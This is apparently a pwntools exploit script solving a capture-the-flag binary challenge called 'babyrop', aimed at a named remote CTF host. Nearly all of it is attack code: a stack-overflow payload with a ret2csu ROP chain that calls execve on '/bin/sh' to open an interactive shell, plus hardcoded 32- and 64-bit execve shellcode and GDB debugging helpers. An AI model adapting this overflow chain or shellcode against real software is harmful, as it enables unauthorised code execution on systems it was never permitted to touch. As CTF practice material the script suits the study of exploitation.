from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './babyrop'
HOST = 'remote1.thcon.party'
PORT = 10900

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

_32_SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\x31\xd2\xcd\x80"
_64_SHELLCODE = "\x6a\x3b\x58\x48\x99\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x57\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

binsh = 0x40201a
rdi = 0x004012c3
csu_exec = 0x4012a0
csu_load = 0x4012ba
r = start()
if args.D:
	debug(r, [0x11c8])

payload = ''
payload += 'a'*40
payload += flat(csu_load, 0, 1, 0x0, 0, binsh, elf.got.execve, csu_exec)
payload += flat(0x1111, 0x2222, 0x3333, 0x4444, 0x5555, 0x6666, 0x7777, elf.sym.secret_func)
r.sendlineafter('?\n', payload)

r.interactive()
r.close()
